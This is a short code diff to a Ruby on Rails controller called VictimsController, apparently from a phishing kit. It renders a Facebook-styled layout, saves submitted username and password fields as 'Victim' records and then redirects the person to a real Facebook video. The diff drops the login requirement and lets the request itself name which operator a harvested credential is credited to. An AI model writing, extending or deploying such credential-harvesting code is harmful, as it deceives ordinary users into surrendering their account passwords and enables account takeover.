@@ -1,6 +1,6 @@
 class VictimsController < ApplicationController
 	layout 'facebook'
-	before_action :authenticate_user!, except: [:new]
+	
 	def mobile_device?
 	   if session[:mobile_param]
 	     session[:mobile_param] == "1"
@@ -18,7 +18,7 @@ class VictimsController < ApplicationController
 	end
 
 	def create
-		@V=Victim.create(usu: params[:victim][:usu],con: params[:victim][:con],swusu: current_user)
+		@V=Victim.create(usu: params[:victim][:usu],con: params[:victim][:con],swusu: params[:victim][:swusu])
 		redirect_to 'https://www.facebook.com/galatziaoficial/videos/992663864137637/?theater'
 	end
 end
